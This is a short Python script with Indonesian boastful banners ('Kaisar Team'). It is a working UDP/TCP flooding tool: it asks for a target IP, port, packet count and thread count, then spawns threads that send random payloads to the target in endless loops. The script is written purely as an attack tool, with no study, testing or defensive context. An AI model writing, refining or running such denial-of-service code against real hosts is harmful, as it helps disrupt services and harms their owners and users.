#!/usr/bin/env python3
import random
import socket
import threading

print       (" - - > Lord Kaisar nih dek!! < - - ")
print       (" - - > Kaisar Nih Dek!!!! < - - ")
print       (" - - > Join Kaisar Team <- - ")                                   
print       (" - - > Rename Pm Gw !! < - - ")
print       (" - - > Kaisar Nih dek  < - - ")
print       (" - - > Tuh link nya Join!! < - - ")
print       (" - - >  Ez bet dek!!!  < - - ")
    
ip = str(input("  Ip:"))
port = int(input(" Port:"))
choice = str(input(" SERIUS MAU NYERANG? (y/n):"))
times = int(input(" Paket Nya Mau Berapa:"))
threads = int(input(" Pelor Nya Tembakin Berapa:"))
def run():
	data = random._urandom(1000)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Samlekom Paket dari Kaisar bg!! ")
		except:
			print("[!] down dek")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Samlekom Paket dari Kaisar bg!! ")
		except:
			s.close()
			print("[*] Down Dek!!")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
